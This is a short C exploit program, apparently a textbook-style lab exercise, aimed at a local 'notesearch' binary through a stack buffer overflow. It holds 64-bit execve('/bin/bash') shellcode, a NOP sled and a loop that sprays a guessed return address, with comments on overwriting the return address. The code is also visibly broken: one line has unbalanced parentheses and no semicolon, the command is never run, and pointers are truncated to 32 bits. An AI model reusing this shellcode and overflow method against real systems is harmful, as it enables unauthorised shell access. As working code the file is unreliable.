#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// there is a potential overflow opportunity in the following buffer:
// int userid, printing=1, fd; // file descriptor
// char searchstring[100];
// note also how the buffer is defined AFTER both the userid variable, and the fd (file descriptor) variable!!!!   These can be overflowed, but we're really after a return address that would be popped onto the stack even before those.


// execve_64bit_binbash.asm/elf -> objdump -> tr/sed
// 39 bytes 64bit execve("///////bin/bash");
char sc[]="\x48\x31\xc0\x50\x54\x5a\x48\xbb\x62\x69\x6e\x2f\x62\x61\x73\x68\x53\x48\xbb\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x53\x54\x5f\x50\x57\x54\x5e\xb0\x3b\x0f\x05";

int main(int argc, char *argv[]){
	unsigned int i, *ptr, ret, offset=270;
	char *cmd, *buf;
	cmd = (char *) malloc(200);
	bzero(cmd,200);
	strcpy(cmd, "./notesearch_booksrc.elf \'");
	buf = cmd + strlen(cmd);
	if(argc > 1){
		offset = atoi(argv[1]);
	}
	ret = (unsigned int) &i - offset;
	for(i=0; i<160; i+=8){
		*((unsigned int*)(buf+i) = ret
	}
	memset(buf, 0x90, 60);
	memcpy(buf+60,sc,sizeof(sc)-1);
	strcat(cmd,"\'");
}


